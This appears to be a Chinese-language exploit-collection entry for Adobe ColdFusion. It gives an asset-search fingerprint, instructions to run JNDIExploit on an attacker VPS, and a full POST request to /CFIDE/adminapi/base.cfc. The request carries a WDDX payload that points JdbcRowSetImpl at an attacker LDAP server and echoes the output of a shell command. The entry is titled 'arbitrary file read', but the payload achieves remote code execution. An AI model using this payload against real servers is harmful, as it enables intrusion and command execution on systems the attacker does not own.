# AdobeColdFusionpms存在任意文件读取

- **系统**：AdobeColdFusionpms　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="Adobe-ColdFusion"`
- **请求**：`POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1`

**请求体 / payload**
```
将`JNDIExploit-1.4-SNAPSHOT.jar`上传到VPS
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPSIP
\[JNDIExploit-1.4-SNAPSHOT.jar]\(公众号：渗透安全HackTwo>\

Host:
Content-Length: 400
Content-Type: application/x-www-form-urlencoded
cmd: id
argumentCollection=
<wddxPacket version='1.0'>
<header/>
<data>
<struct type='xcom.sun.rowset.JdbcRowSetImplx'>
<var name='dataSourceName'>
<string>ldap://xx:1389/Basic/TomcatEcho</string>
</var>
<var name='autoCommit'>
<boolean value='true'/>
</var>
</struct>
</data>
</wddxPacket>
```

**其他**
- AdobeColdFusion pms存在任意文件读取: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Adobe ColdFusion